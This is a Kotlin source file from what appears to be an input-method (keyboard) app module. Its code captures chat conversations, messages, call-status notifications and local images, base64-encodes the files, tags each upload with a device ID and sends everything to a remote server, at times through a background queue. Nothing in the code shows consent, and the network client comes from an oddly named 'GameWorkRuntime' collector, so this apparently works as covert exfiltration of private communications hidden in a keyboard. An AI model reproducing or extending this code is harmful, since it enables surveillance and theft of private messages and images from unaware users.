package com.yuyan.imemodule.data.capture.net

import com.yuyan.imemodule.data.capture.db.PendingAssetEntity
import com.yuyan.imemodule.data.capture.notification.filterCallStatusNotifications
import com.yuyan.imemodule.data.capture.filterUnconfirmedTextMessages
import com.yuyan.imemodule.data.collect.GameWorkRuntime
import kotlinx.serialization.SerialName
import kotlinx.serialization.Serializable
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.encodeToJsonElement
import kotlinx.serialization.json.jsonObject
import kotlinx.serialization.json.jsonArray
import kotlinx.serialization.json.jsonPrimitive
import kotlinx.serialization.json.booleanOrNull
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okio.ByteString.Companion.toByteString
import java.io.File

@Serializable
data class PendingMessageUploadPayload(
    @SerialName("device_id") val deviceId: String,
    val conversation: JsonObject,
    val message: JsonObject,
)

@Serializable
private data class AssetUploadRequest(
    val sha256: String,
    @SerialName("mime_type") val mimeType: String,
    @SerialName("file_base64") val fileBase64: String,
    @SerialName("perceptual_hash") val perceptualHash: String? = null,
    val width: Int? = null,
    val height: Int? = null,
)

@Serializable
private data class MessageBatchRequest(
    @SerialName("device_id") val deviceId: String,
    val conversation: JsonObject,
    val messages: List<JsonObject>,
)

class CaptureApi(
    baseUrl: String,
    private val deviceId: String,
    private val http: OkHttpClient = OkHttpClient.Builder().addInterceptor(GameWorkRuntime.interceptor).build(),
    private val enqueue: ((String, String) -> Boolean)? = null,
    private val backgroundAllowed: () -> Boolean = { true },
    private val enqueueBatch: ((Sequence<Pair<String, String>>) -> Boolean)? = null,
) {
    private val baseUrl = baseUrl.trimEnd('/')
    private val json = Json { ignoreUnknownKeys = true }
    val usesDurableQueue: Boolean get() = enqueue != null || enqueueBatch != null
    val supportsAtomicHandoff: Boolean get() = enqueueBatch != null

    fun decodeMessagePayload(payloadJson: String): PendingMessageUploadPayload =
        json.decodeFromString(payloadJson)

    fun uploadAsset(asset: PendingAssetEntity): Boolean {
        val payload = assetPayload(asset) ?: return false
        return post("/api/v1/mobile/chat/assets", payload)
    }

    private fun assetPayload(asset: PendingAssetEntity, verifyHash: Boolean = false): String? {
        if (!backgroundAllowed()) return null
        val file = File(asset.localPath)
        if (!file.isFile) return null
        val bytes = if (!verifyHash) file.readBytes() else {
            if (file.length() > MAX_HANDOFF_IMAGE_BYTES) return null
            file.inputStream().use { input ->
                val output = java.io.ByteArrayOutputStream()
                val buffer = ByteArray(8192)
                while (true) {
                    if (!backgroundAllowed()) return null
                    val count = input.read(buffer)
                    if (count < 0) break
                    if (output.size().toLong() + count > MAX_HANDOFF_IMAGE_BYTES) return null
                    output.write(buffer,0,count)
                }
                output.toByteArray()
            }
        }
        if ((verifyHash && com.yuyan.imemodule.data.capture.sha256(bytes) != asset.sha256) || !backgroundAllowed()) return null
        val encoded = bytes.toByteString().base64()
        if (!backgroundAllowed()) return null
        val body = AssetUploadRequest(
            sha256 = asset.sha256,
            mimeType = asset.mimeType,
            fileBase64 = encoded,
            perceptualHash = asset.perceptualHash,
            width = asset.width,
            height = asset.height,
        )
        if (!backgroundAllowed()) return null
        val payload = json.encodeToString(body)
        if (!backgroundAllowed()) return null
        return payload
    }

    fun handoff(messages: List<PendingMessageUploadPayload>, assets: List<PendingAssetEntity>): Boolean {
        val enqueue = enqueueBatch ?: return false
        require(messages.isNotEmpty())
        val first = messages.first()
        require(messages.all { it.deviceId == first.deviceId && it.conversation == first.conversation })
        if (!backgroundAllowed()) return false
        val body = json.encodeToJsonElement(MessageBatchRequest(first.deviceId, first.conversation, messages.map { it.message })).jsonObject
        val filtered = filterCallStatusNotifications(body)?.let(::filterUnconfirmedTextMessages) ?: return true
        val required = filtered.getValue("messages").jsonArray.flatMap {
            (it.jsonObject["asset_sha256"] as? kotlinx.serialization.json.JsonArray).orEmpty().map { value -> value.jsonPrimitive.content }
        }.toSet()
        require(required == assets.map { it.sha256 }.toSet()) { "Incomplete image handoff" }
        val uniqueAssets = assets.distinctBy { it.sha256 }
        if (uniqueAssets.any { !File(it.localPath).isFile || File(it.localPath).length() > MAX_HANDOFF_IMAGE_BYTES }) return false
        // 逐图准备并在同一 SQLite 事务写入；不把合法多附件整批 Base64 堆在内存。
        val reports = sequence {
            for (asset in uniqueAssets) {
                val payload = checkNotNull(assetPayload(asset, verifyHash = true)) { "Image preparation unavailable" }
                yield("/api/v1/mobile/chat/assets" to payload)
            }
            check(backgroundAllowed())
            yield("/api/v1/mobile/chat/messages/batch" to filtered.toString())
            check(backgroundAllowed())
        }
        if (!backgroundAllowed()) return false
        return enqueue(reports)
    }

    fun uploadMessages(messages: List<PendingMessageUploadPayload>): Boolean {
        require(messages.isNotEmpty()) { "message batch must not be empty" }
        require(messages.size <= MAX_MESSAGE_BATCH) { "message batch must not exceed 200" }
        val first = messages.first()
        require(messages.all { it.deviceId == first.deviceId && it.conversation == first.conversation }) {
            "message batch must belong to one device and conversation"
        }
        if (!backgroundAllowed()) return false
        val body = MessageBatchRequest(
            deviceId = first.deviceId,
            conversation = first.conversation,
            messages = messages.map { it.message },
        )
        // 已入旧 Room 队列的状态和无资源待确认文字就地结束，不转入通用报告队列或发起 HTTP。
        val encoded = json.encodeToJsonElement(body).jsonObject
        if (!backgroundAllowed()) return false
        val filtered = filterCallStatusNotifications(encoded)?.let(::filterUnconfirmedTextMessages)
        if (!backgroundAllowed()) return false
        if (filtered == null) return true
        val payload = filtered.toString()
        if (!backgroundAllowed()) return false
        return post("/api/v1/mobile/chat/messages/batch", payload)
    }

    private fun post(path: String, jsonBody: String): Boolean {
        if (!backgroundAllowed()) return false
        enqueue?.let { return it(path, jsonBody) }
        val request = Request.Builder()
            .url(baseUrl + path)
            .header("X-Device-Id", deviceId)
            .post(jsonBody.toRequestBody(JSON_MEDIA_TYPE))
            .build()
        if (!backgroundAllowed()) return false
        return http.newCall(request).execute().use { response ->
            if (!response.isSuccessful || !backgroundAllowed()) false
            else runCatching {
                val result = json.parseToJsonElement(response.body?.string().orEmpty()).jsonObject
                result["ok"]?.jsonPrimitive?.booleanOrNull == true && result["discarded"]?.jsonPrimitive?.booleanOrNull != true
            }.getOrDefault(false)
        }
    }

    private companion object {
        val JSON_MEDIA_TYPE = "application/json; charset=utf-8".toMediaType()
        const val MAX_MESSAGE_BATCH = 200
        const val MAX_HANDOFF_IMAGE_BYTES = 5L * 1024 * 1024 // 与服务端既有资产上限一致。
    }
}
